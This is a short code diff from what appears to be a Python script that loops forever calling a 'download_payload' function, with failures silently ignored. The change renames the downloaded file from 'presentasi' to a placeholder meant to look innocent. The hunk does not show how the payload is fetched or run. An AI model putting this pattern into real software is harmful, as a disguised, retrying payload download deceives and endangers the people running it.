@@ -86,7 +86,7 @@ while True:
         pass
 
     try:
-        download_payload(file_name="presentasi", delete_before_trying=True)
+        download_payload(file_name="put a totally not suspicious name here", delete_before_trying=True)
     except Exception:  # NOQA (No Quality Assurance, suppressed the warning)
         pass
 
